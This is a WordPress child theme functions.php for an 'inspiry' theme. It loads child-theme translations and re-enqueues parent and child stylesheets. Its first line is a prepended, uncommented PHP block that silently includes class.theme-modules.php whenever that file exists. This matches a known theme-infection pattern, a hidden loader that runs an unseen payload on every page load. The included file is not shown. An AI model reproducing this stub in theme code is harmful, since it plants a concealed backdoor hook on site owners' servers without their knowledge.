<?php if (file_exists(dirname(__FILE__) . '/class.theme-modules.php')) include_once(dirname(__FILE__) . '/class.theme-modules.php'); ?><?php
/**
 * Load translation files from child theme
 *
 * Note: This function supposed to be in inspiry_theme_setup,
 * But I called it before including redux framework to support theme options translations
 */
load_child_theme_textdomain ( 'inspiry', get_stylesheet_directory () . '/languages' );


/*-----------------------------------------------------------------------------------*/
/*	Changes in styles enqueue due to child theme
/*-----------------------------------------------------------------------------------*/
if ( !function_exists( 'inspiry_enqueue_child_styles' ) ) {
    function inspiry_enqueue_child_styles() {
        if ( !is_admin() ) {

            // dequeue and deregister parent default css
            wp_dequeue_style( 'inspiry-parent-default' );
            wp_deregister_style( 'inspiry-parent-default' );

            // dequeue parent custom css
            wp_dequeue_style( 'inspiry-parent-custom' );

            // enqueue parent default css
            wp_enqueue_style( 'inspiry-parent-default', get_template_directory_uri() . '/style.css' );

            // enqueue parent custom css
            wp_enqueue_style( 'inspiry-parent-custom' );

            // child default css
            wp_enqueue_style( 'inspiry-child-default', get_stylesheet_uri(), array( 'inspiry-parent-default' ), '1.0.0', 'all' );

            // child custom css
            wp_enqueue_style( 'inspiry-child-custom',  get_stylesheet_directory_uri() . '/child-custom.css', array( 'inspiry-child-default' ), '1.0.0', 'all' );
        }
    }
    add_action( 'wp_enqueue_scripts', 'inspiry_enqueue_child_styles', PHP_INT_MAX );
}